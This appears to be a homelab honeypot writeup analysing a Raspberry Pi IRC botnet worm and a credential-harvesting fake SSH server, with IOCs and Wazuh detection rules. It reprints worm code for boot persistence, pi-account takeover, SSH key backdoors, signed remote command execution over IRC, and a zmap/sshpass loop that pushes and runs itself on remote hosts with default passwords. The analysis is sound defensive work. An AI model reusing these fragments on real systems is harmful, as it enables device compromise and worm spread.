# IRC Botnet Worm — Full Source Capture & Analysis

**Document ID:** NINGI-WRITEUP-005
**Date:** 2026-03-13
**Category:** Malware Analysis — Complete Source Capture
**Environment:** fuji-mailbox VPS — Cowrie 2.x / Wazuh 4.14.0
**Severity:** Critical

---

## Overview

Two attackers (`141.164.144.181` on 2026-03-02 and `64.92.6.70` on 2026-03-04) uploaded complete copies of a self-replicating IRC botnet worm to the Cowrie honeypot via stdin, and I captured the full source intact. The script is a sophisticated bash worm that establishes IRC-based C2 with RSA-signed commands, propagates autonomously via `zmap` and `sshpass`, kills competing malware, hijacks the `pi` user account, and installs boot persistence, all targeting Raspberry Pi devices running default credentials.

This is the most complete malware artefact I captured in the honeypot during this period. Both uploads are byte-different copies of the same script, with only the random seed in the Cowrie header changing, which confirms two independent campaign nodes operating the same tooling.

---

## Artifact Details

| Attribute | File 1 | File 2 |
|---|---|---|
| SHA-256 | `b4c8f6e4...ef15db829` | `595a0565...fca40d6` |
| Source IP | `141.164.144.181` | `64.92.6.70` |
| Upload date | 2026-03-02T12:42:46Z | 2026-03-04T21:26:34Z |
| Capture method | Cowrie stdin | Cowrie stdin |
| File type | Bash worm (misidentified as `data` by `file`) | Identical |

The `file` command reported both as raw `data` because Cowrie prepends a header (`C0755 4745 <random>`) before the `#!/bin/bash` shebang. Stripping the header reveals complete, readable script source.

---

## Attack Chain

```
Attacker logs in → uploads script via stdin
        │
        ▼
  [If not root]
        ├── Copy self to /opt/<random>
        ├── Rewrite /etc/rc.local for boot persistence
        └── Reboot → re-execute as root
        │
        ▼
  [Running as root]
        ├── 1. Kill competing malware processes
        ├── 2. Blackhole competitor C2 domain in /etc/hosts
        ├── 3. Change 'pi' user password (account takeover)
        ├── 4. Inject SSH backdoor key into /root/.ssh/authorized_keys
        ├── 5. Ensure 8.8.8.8 in /etc/resolv.conf
        ├── 6. Write RSA public key for signed C2 verification
        ├── 7. Spawn IRC bot → Undernet → #biret (runs forever)
        └── 8. Install zmap + sshpass → scan port 22 → self-propagate
```

---

## Stage-by-Stage Analysis

### Stage 1 — Boot Persistence

```bash
if [ "$EUID" -ne 0 ]; then
    NEWMYSELF=`mktemp -u 'XXXXXXXX'`
    sudo cp $MYSELF /opt/$NEWMYSELF
    sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
    sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
    sudo sh -c "echo 'exit 0' >> /etc/rc.local"
    sleep 1
    sudo reboot
fi
```

If running without root, the script escalates via `sudo`, copies itself to `/opt/` under a random 8-character name, overwrites `/etc/rc.local` to execute on every boot, then forces a reboot. After reboot it runs as root automatically and proceeds to the payload stages. The random filename makes the persisted copy harder to find by name.

**MITRE ATT&CK:** T1037.004 — Boot or Logon Initialization Scripts: RC Scripts

---

### Stage 2 — Kill Competing Malware

```bash
killall bins.sh minerd node nodejs
killall ktx-armv4l ktx-i586 ktx-m68k ktx-mips ktx-mipsel ktx-powerpc ktx-sh4 ktx-sparc
killall arm5 zmap kaiten perl
```

Before installing itself, the worm terminates a specific list of competing malware:

| Process | Malware family |
|---|---|
| `minerd` | CPU cryptominer (cpuminer) |
| `ktx-*` | Kaiten/Knight IRC bot, multiple architectures |
| `kaiten` | Original Kaiten DDoS IRC bot |
| `bins.sh` | Generic botnet dropper (the competitor campaign) |
| `zmap` | Kills any existing scanner (replaced by own) |
| `perl` | Perl-based IRC bots (eggdrop variants) |
| `node`/`nodejs` | JS-based miners and bots |

This is deliberate turf war behaviour — the worm is designed to evict other malware families and take sole control of the host before establishing persistence.

**MITRE ATT&CK:** T1562 — Impair Defenses

---

### Stage 3 — Block Competitor C2 Domain

```bash
echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
```

Blackholes a specific competitor C2 domain by redirecting it to localhost. This prevents previously installed `bins.sh` campaign malware from receiving commands or re-infecting the host. The domain `bins.deutschland-zahlung.eu` is a known Mirai-era botnet C2 — the worm author is aware of it specifically and eliminates it as competition.

---

### Stage 4 — Account Takeover

```bash
usermod -p '$6$vGkGPKUr$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1' pi
```

Replaces the `pi` user's password with a hardcoded SHA-512 hash, overwriting the default `raspberry` password. The same hash appears in both script variants — a shared credential used across the entire campaign. Any Raspberry Pi running this worm has its `pi` account silently hijacked.

**MITRE ATT&CK:** T1098 — Account Manipulation

---

### Stage 5 — SSH Backdoor Key Injection

```bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN..." >> /root/.ssh/authorized_keys
```

Injects a hardcoded RSA public key into `/root/.ssh/authorized_keys`. This is a distinct key from the `mdrfckr` key documented in WRITEUP-004, confirming a separate campaign. Any host infected by this worm is permanently backdoored for the operator's SSH access.

**MITRE ATT&CK:** T1098.004 — Account Manipulation: SSH Authorized Keys

---

### Stage 6 — Clean Up Prior Infections

```bash
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten
```

Removes known artefacts of competing malware from temp directories, further consolidating sole control of the host.

---

### Stage 7 — IRC C2 Bot with RSA-Signed Commands

The worm writes an RSA public key to `/tmp/public.pem`, then drops and executes a full IRC bot as a background process:

**C2 infrastructure:**

| Attribute | Value |
|---|---|
| Protocol | IRC plaintext, port 6667 |
| Network | Undernet (legitimate public IRC network, abused) |
| Channel | `#biret` |
| Nick format | `a` + last 8 chars of `uname -a \| md5sum` |

The nick generation is deterministic per host — `uname -a` is stable on a given machine, so the operator gets a consistent, unique identifier for each compromised node.

**RSA-signed command execution — the key security mechanism:**

```bash
hash=`echo $privmsg_data | base64 -d | md5sum | awk -F' ' '{print $1}'`
sign=`echo $privmsg_h | base64 -d | openssl rsautl -verify -inkey /tmp/public.pem -pubin`
if [[ "$sign" == "$hash" ]]; then
    CMD=`echo $privmsg_data | base64 -d`
    RES=`bash -c "$CMD" | base64 -w 0`
    printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3
fi
```

Commands arrive as IRC PRIVMSGs containing two base64-encoded fields: the command itself and an RSA signature. The bot verifies the signature against the embedded public key using `openssl rsautl`. Only messages signed with the corresponding RSA private key are executed. Output is base64-encoded and returned to the operator via PRIVMSG.

This means even if a defender joins `#biret` and sends commands to the bots, they cannot execute anything without the operator's RSA private key. The botnet is cryptographically exclusive to its operator.

After spawning, the bot script deletes itself from disk:
```bash
nohup /tmp/$BOT 2>&1 > /tmp/bot.log &
sleep 3
rm -rf /tmp/$BOT
```

The process runs in memory via `nohup`, leaving no script file on disk — only a `bot.log` file and the running process.

**MITRE ATT&CK:** T1071.003 — Application Layer Protocol: IRC C2

---

### Stage 8 — Autonomous Propagation via zmap

```bash
apt-get install zmap sshpass -y --force-yes
while [ true ]; do
    FILE=`mktemp`
    zmap -p 22 -o $FILE -n 100000
    killall ssh scp
    for IP in `cat $FILE`; do
        sshpass -praspberry scp ... $MYSELF pi@$IP:/tmp/$NAME
        sshpass -praspberry ssh pi@$IP ... "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
        sshpass -praspberryraspberry993311 scp ... $MYSELF pi@$IP:/tmp/$NAME
        sshpass -praspberryraspberry993311 ssh pi@$IP ... "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
    done
    rm -rf $FILE
    sleep 10
done
```

The propagation loop runs indefinitely:

1. `zmap -p 22 -n 100000` — scans 100,000 random internet IPs for open SSH port 22
2. For each responding IP, attempts SCP to copy itself as `pi@IP:/tmp/<random>`
3. If SCP succeeds, SSHes in and executes the copy
4. Tries two Raspberry Pi default passwords: `raspberry` and `raspberry993311` (a common variant)
5. Sleeps 10 seconds, repeats

Each infected host becomes a new propagation node, scanning for and infecting further targets. This is a classic worm propagation model — exponential spread across internet-facing Raspberry Pi devices with default credentials.

**The `bins.deutschland-zahlung.eu` blackhole from Stage 3 makes sense here** — that domain belongs to a competing worm using the same `raspberry` credential vector. The author is specifically eliminating the competition on each newly infected host.

**MITRE ATT&CK:** T1210 — Exploitation of Remote Services (SSH credential spray), T1570 — Lateral Tool Transfer

---

## The 94f2e4d8 Binary — SSH Server Replacement

The binary uploaded by five separate IPs including `142.93.220.184` (the sshd masquerader from WRITEUP-002) reveals itself via strings analysis as a **Go-based SSH server replacement** compiled with CGo PAM support:

```
libpam.so.0
pam_chauthtok / pam_acct_mgmt / pam_open_session
_cgo_129d52bb6bd3_Cfunc_mygetpwnam_r
_cgo_6cc2654a8ed3_C2func_getaddrinfo
crosscall_amd64
```

Key indicators:
- Full PAM authentication stack (pam_open_session, pam_acct_mgmt, pam_chauthtok) — this binary handles SSH authentication itself
- `mygetpwnam_r` — custom password lookup, likely logs credentials
- `getaddrinfo` / `getnameinfo` — DNS resolution for C2 callback
- `BuildID[sha1]=300bf5c7e304c732122f0b0fa290bda984441bd6` — unique build, not stripped of build ID unlike the other binaries
- Compiled for GNU/Linux 3.2.0+ (broad compatibility)

**Assessment:** This is a credential-harvesting fake SSH server. When placed as the system `sshd` (as `142.93.220.184` did with their `nohup ./<random>/sshd &` pattern from WRITEUP-002), it accepts legitimate SSH connections, logs all credentials entered, and forwards them to the operator — while appearing as a normal `sshd` process.

The `TegskTGfBzL5ZXVeATJZ/Kg4gGwZNHviZINPIVp6K/-aw3x4amOW3feyTomlq7/WXkOJPhAhVPtgkpGtlhH` string near the top of the binary is likely an encrypted C2 address or embedded API key.

**MITRE ATT&CK:** T1036.005 — Masquerade: Match Legitimate Name, T1557 — Adversary-in-the-Middle (credential capture)

---

## Complete Artifact Inventory

| SHA-256 (first 16) | Type | Source IPs | Assessment |
|---|---|---|---|
| `87962f5746b0bdaf` | Shell script | `185.242.3.105` | Mirai multi-arch dropper (sshbins.sh) |
| `b4c8f6e4e5ca7f71` | Bash worm | `141.164.144.181` | IRC botnet worm — full source |
| `595a0565461528e3` | Bash worm | `64.92.6.70` | IRC botnet worm — variant copy |
| `a8460f446be54041` | SSH public key | 7 IPs | mdrfckr Mirai backdoor key |
| `94f2e4d8d4436874` | ELF 64-bit Go | 5 IPs incl. `142.93.220.184` | Fake SSH server / credential harvester |
| `eae72481b8234878` | ELF 32-bit static | `103.59.160.195` | IoT/Mirai binary (Linux 2.6.9 target) |
| `60496d5648c20f14` | ELF 32-bit static | Older volume | IoT/Mirai binary (Linux 2.6.9 target) |
| `e3b0c44298fc1c14` | Empty file | `123.234.3.106`, `182.40.104.74` | SHA-256 of empty — failed upload |
| Multiple others | ELF 64-bit packed | Various | Packed binaries, missing section headers |

---

## Indicators of Compromise

| Type | Value |
|---|---|
| IP | `141.164.144.181` — worm upload |
| IP | `64.92.6.70` — worm upload |
| SHA-256 | `b4c8f6e4e5ca7f71f5b94470d34880aa66d25bf88bbf405a0365ba3ef15db829` |
| SHA-256 | `595a0565461528e335b8a4c3e93f305bec04089c04a641c233e28a26ffca40d6` |
| IRC network | Undernet, port 6667 |
| IRC channel | `#biret` |
| C2 domain (blocked) | `bins.deutschland-zahlung.eu` |
| SSH key (partial) | `AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJIS...` |
| Password hash | `$6$vGkGPKUr$heqvOhUzvbQ66Nb0JGCijh/81sG1WAC...` |
| Credentials used | `pi:raspberry`, `pi:raspberry993311` |
| Persistence path | `/opt/<8 random chars>` + `/etc/rc.local` |
| Process name | `nohup` + random 8-char name in `/tmp/` |

**Detection on live systems:**
```bash
# Check for mdrfckr or worm SSH keys
grep -r "mdrfckr\|Cl0kIN33" /home/*/.ssh/ /root/.ssh/ 2>/dev/null

# Check rc.local for persistence
cat /etc/rc.local

# Check for worm artefacts
ls /opt/ | grep -E '^[A-Za-z0-9]{8}$'

# Check for IRC bot process
ps aux | grep -E 'nohup|/dev/tcp'

# Check for compromised pi password (compare hash)
grep pi /etc/shadow
```

---

## Detection Rules

```xml
<!-- IRC C2 connection attempt via /dev/tcp -->
<rule id="100113" level="14">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>/dev/tcp.*6667\|undernet\.org</match>
  <description>Cowrie: IRC C2 connection via /dev/tcp — IRC botnet</description>
  <group>cowrie,c2,irc_bot,</group>
</rule>

<!-- Competitor malware kill list — indicates turf war worm -->
<rule id="100114" level="13">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>killall kaiten\|killall minerd\|killall ktx-</match>
  <description>Cowrie: Competitor malware kill — self-propagating worm activity</description>
  <group>cowrie,malware,worm,</group>
</rule>

<!-- zmap propagation scan -->
<rule id="100115" level="14">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>zmap -p 22\|sshpass -praspberry</match>
  <description>Cowrie: SSH worm propagation — zmap scan + sshpass spray</description>
  <group>cowrie,malware,worm,propagation,</group>
</rule>

<!-- rc.local persistence installation -->
<rule id="100116" level="15">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>etc/rc.local\|rc\.local</match>
  <description>Cowrie: Boot persistence via rc.local</description>
  <group>cowrie,persistence,</group>
</rule>
```

---

## MITRE ATT&CK Summary

| Technique | ID | Observed |
|---|---|---|
| Boot or Logon Init: RC Scripts | T1037.004 | /etc/rc.local rewrite for persistence |
| Account Manipulation | T1098 | pi user password replacement |
| SSH Authorized Keys | T1098.004 | Hardcoded backdoor key injection |
| Impair Defenses | T1562 | killall competitor processes |
| IRC C2 | T1071.003 | Undernet #biret command channel |
| Lateral Tool Transfer | T1570 | scp self-copy to new targets |
| SSH Brute Force | T1110.001 | sshpass with default pi credentials |
| Masquerade: Match Legitimate Name | T1036.005 | 94f2e4d8 binary deployed as sshd |
| Adversary-in-the-Middle | T1557 | Fake SSH server capturing credentials |

---

## Lessons Learned

- **Cowrie stdin capture is high-value.** Both worm copies were uploaded interactively via stdin — Cowrie captured the complete source without any special configuration. Any attacker who types or pipes a script into an SSH session has it recorded.
- **The `file` command is not definitive.** Both scripts were misidentified as raw `data` due to the Cowrie header prefix. `xxd` and `strings` revealed the true content. Always use multiple analysis methods.
- **RSA-signed IRC C2 is not new but remains effective.** The use of `openssl rsautl` for command verification is a well-known technique that prevents botnet hijacking — a defender joining `#biret` cannot issue commands without the private key.
- **Malware ecosystems compete.** The explicit blackholing of `bins.deutschland-zahlung.eu` and the `killall` competitor list demonstrates active awareness of competing campaigns. Internet-facing honeypots attract multiple simultaneous campaigns that actively interfere with each other.
- **Raspberry Pi default credentials remain a live threat.** Both passwords targeted (`raspberry`, `raspberry993311`) are default or near-default Pi credentials. Any Raspberry Pi exposed to the internet with default credentials will be compromised and enlisted in this worm within hours.

---

*Everything in this writeup came from real attack traffic captured by my Cowrie honeypot between 2026-03-02 and 2026-03-13.*  
*I documented it as part of the homelab research project.*
